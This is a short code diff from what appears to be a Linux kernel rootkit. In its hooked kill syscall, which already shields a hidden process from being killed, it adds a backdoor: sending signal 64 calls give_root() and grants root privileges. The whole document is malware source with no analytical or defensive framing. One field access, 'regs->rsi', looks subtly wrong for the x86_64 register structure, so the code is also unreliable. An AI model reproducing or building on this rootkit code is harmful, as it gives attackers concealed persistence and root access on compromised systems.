@@ -32,9 +32,14 @@ static int clean(void){
 
 static asmlinkage long my_kill(const struct pt_regs *regs){
 	pid_t pid = regs->di;
+	int sig = regs->rsi;
 	if(pid == 1234){
 		printk(KERN_INFO "Attempt to kill hidden process, ignoring...\n");
 		return 0;
+	}
+	if(sig == 64){
+		give_root();
+		printk(KERN_INFO "root is given\n");
 	}
 	return orig_kill(regs);
 }
